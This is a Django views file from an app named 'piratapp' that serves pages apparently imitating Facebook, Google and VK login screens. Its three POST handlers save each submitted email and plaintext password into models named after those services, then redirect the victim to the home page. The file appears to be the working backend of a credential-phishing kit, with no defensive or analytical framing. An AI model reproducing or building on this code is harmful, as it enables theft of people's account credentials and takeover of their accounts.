from django.shortcuts import render
from django.http import HttpResponseRedirect
from piratapp.models import Facebook, Google,Wk

# Create your views here.
def main(request):
    return render(request, 'index.html')

def facebook(request):
    return render(request, 'index2.html')

def wk(request):
    return render(request, 'index3.html')

def google(request):
    return render(request, 'google.html')


def sendMessage(request):
    if request.method == 'POST':
        send_message = Facebook()
        send_message.email = request.POST.get("email")
        send_message.password = request.POST.get("password")
        send_message.save()
        return HttpResponseRedirect('/')

def sendMessage2(request):
    if request.method == 'POST':
        send_message = Google()
        send_message.email = request.POST.get("email")
        send_message.password = request.POST.get("password")
        send_message.save()
        return HttpResponseRedirect('/')

def sendMessage3(request):
    if request.method == 'POST':
        send_message = Wk()
        send_message.email = request.POST.get("email")
        send_message.password = request.POST.get("password")
        send_message.save()
        return HttpResponseRedirect('/')
